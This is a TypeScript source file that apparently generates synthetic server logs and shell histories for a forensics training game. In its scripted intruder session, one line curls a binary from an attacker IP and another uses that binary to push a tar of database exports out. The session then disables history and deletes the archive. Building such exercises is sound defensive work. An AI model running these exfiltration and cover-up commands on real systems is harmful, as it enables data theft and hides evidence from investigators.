// Records on helix-db01 shared by several Act 4 levels (L16 auth.log, L18-L20 shell records),
// generated once from the same facts so every level shows the same night.
import type { VFile } from '../../engine/schema';
import { type SshEvent, seeded, spread, sshdLog, syslogTime } from '../lib/logs';
import { ACT4 } from './story';

export const AUTH_LOG = '/var/log/auth.log';
export const CMDLOG = '/var/log/commands.log';

const STAFF = ['m.chen', 'r.khalil', 'a.nasser', 'p.novak'];

/** sshd logins plus every sudo call (sudo logs `sudo -l` as COMMAND=list). */
export function dbAuthLog(): string {
  const events: SshEvent[] = spread('2026-03-12T08:00:00Z', 1500, 36, 16).map((at, i) => ({
    kind: 'accepted', user: STAFF[i % STAFF.length], ip: `10.20.4.${20 + (i % 4) * 3}`, at,
  }));
  events.push({ kind: 'accepted', user: ACT4.secondAccount, ip: ACT4.attackerIp, at: new Date(ACT4.ortizLogin) });
  const lines = sshdLog(ACT4.dbHost, events, 16).trimEnd().split('\n');
  const sudo = (time: string, command: string, user: string = ACT4.secondAccount) =>
    `${time} ${ACT4.dbHost} sudo: ${user} : TTY=pts/0 ; PWD=/home/${user} ; USER=root ; COMMAND=${command}`;
  lines.push(
    sudo('Mar 13 03:45:44', 'list'),
    sudo('Mar 13 03:46:02', '/usr/bin/ls /srv/db/exports'),
    sudo('Mar 13 03:47:30', `/usr/bin/tar czf ${ACT4.archive} /srv/db/exports`),
    sudo(syslogTime(new Date(ACT4.cleanupAt)), `/usr/bin/rm -f ${ACT4.archive}`),
    sudo('Mar 12 10:15:00', '/usr/bin/systemctl restart postgresql', 'r.khalil'),
  );
  return `${lines.sort((a, b) => a.slice(0, 15).localeCompare(b.slice(0, 15))).join('\n')}\n`;
}

type Entry = { at: number; user: string; command: string };
const DIR = ACT4.stagingDir;

/** j.ortiz's whole shell session on Mar 13. ~/.bash_history only kept it up to the push. */
const SESSION: [time: string, command: string][] = [
  ['03:45:22', 'id'],
  ['03:45:31', 'hostname'],
  ['03:45:44', 'sudo -l'],
  ['03:46:02', 'sudo ls /srv/db/exports'],
  ['03:46:40', `curl -s -o ${DIR}/.sync http://${ACT4.attackerIp}/s`],
  ['03:46:52', `chmod +x ${DIR}/.sync`],
  ['03:47:30', `sudo tar czf ${ACT4.archive} /srv/db/exports`],
  ['03:48:06', `ls -la ${DIR}`],
  [ACT4.pushedAt.slice(11, 19), `${DIR}/.sync --push ${ACT4.archive} --via ${ACT4.exfilVia}`],
  [ACT4.historyOffAt.slice(11, 19), 'unset HISTFILE'],
  [ACT4.cleanupAt.slice(11, 19), `sudo rm -f ${ACT4.archive}`],
];

const ROUTINE: Record<string, string[]> = {
  'r.khalil': ['systemctl status postgresql', 'df -h /srv/db', 'ls -lh /srv/db/exports', 'tail -n 50 /var/log/postgresql/postgresql-16-main.log', 'psql -c "select count(*) from orders"', 'vacuumdb --all --analyze'],
  'm.chen': ['ls reports', 'cat reports/q1-summary.txt', 'psql -c "select * from invoices limit 20"', 'cd reports'],
  'p.novak': ['uptime', 'free -m', 'df -h', 'top -b -n 1 | head -15'],
};

function entries(): Entry[] {
  const rand = seeded(1818);
  const users = Object.keys(ROUTINE);
  const list: Entry[] = [];
  for (let i = 0; i < 64; i++) {
    // Staff work office hours; nobody here types commands at 3 a.m.
    const day = rand() < 0.5 ? '2026-03-12' : '2026-03-13';
    const at = Date.parse(`${day}T08:00:00Z`) + Math.floor(rand() * 11 * 3_600_000);
    const user = users[Math.floor(rand() * users.length)];
    list.push({ at, user, command: ROUTINE[user][Math.floor(rand() * ROUTINE[user].length)] });
  }
  list.push({ at: Date.parse('2026-03-12T10:15:00Z'), user: 'r.khalil', command: 'sudo systemctl restart postgresql' });
  [['14:02:10', 'whoami'], ['14:02:31', 'last -n 5'], ['14:05:48', 'grep j.ortiz /var/log/auth.log'], ['14:09:02', 'ls -a /home']].forEach(([time, command]) =>
    list.push({ at: Date.parse(`2026-03-14T${time}Z`), user: 'a.nasser', command }),
  );
  for (const [time, command] of SESSION) list.push({ at: Date.parse(`2026-03-13T${time}Z`), user: ACT4.secondAccount, command });
  return list.sort((a, b) => a.at - b.at);
}

const ALL = entries();
export const unixTime = (iso: string) => Date.parse(iso) / 1000;
/** HISTTIMEFORMAT="%F %T " */
const histTime = (at: number) => new Date(at).toISOString().slice(0, 19).replace('T', ' ');

/** Each command reaches syslog through PROMPT_COMMAND, numbered like `history 1`. */
export function commandsLog(): string {
  const counters: Record<string, number> = { 'r.khalil': 411, 'm.chen': 87, 'p.novak': 153, 'a.nasser': 902, [ACT4.secondAccount]: 0 };
  return `${ALL.map(({ at, user, command }) => {
    counters[user] += 1;
    return `${syslogTime(new Date(at))} ${ACT4.dbHost} bash: ${user}: ${String(counters[user]).padStart(5)}  ${histTime(at)} ${command}`;
  }).join('\n')}\n`;
}

/** ~/.bash_history with HISTTIMEFORMAT set: a "#<unix time>" line above every command. */
export function historyFile(user: string, until = Infinity): VFile {
  const own = ALL.filter((entry) => entry.user === user && entry.at <= until);
  return {
    content: `${own.map(({ at, command }) => `#${at / 1000}\n${command}`).join('\n')}\n`,
    mode: '-rw-------',
    owner: user,
    mtime: new Date(own[own.length - 1].at).toISOString(),
  };
}

/** The hardening that kept a second copy of every command (SEC-114). */
export const HARDENING: Record<string, VFile> = {
  '/etc/profile.d/helix-history.sh': {
    content: [
      '# SEC-114: keep a trustworthy record of shell commands on servers.',
      '# 1) put a timestamp on every history line  2) save it after each command',
      '# 3) copy each command to syslog (local6 -> /var/log/commands.log, forwarded to the SIEM)',
      'export HISTTIMEFORMAT="%F %T "',
      'shopt -s histappend',
      `PROMPT_COMMAND='history -a; logger -p local6.info -t bash "$USER: $(history 1)"'`,
      '',
    ].join('\n'),
    owner: 'root',
    mtime: '2025-11-20T10:00:00Z',
  },
  '/etc/rsyslog.d/30-commands.conf': {
    content: `# SEC-114: shell commands -> local file + central SIEM\nlocal6.*  ${CMDLOG}\nlocal6.*  @@siem.${ACT4.domain}:514\n`,
    owner: 'root',
    mtime: '2025-11-20T10:00:00Z',
  },
};
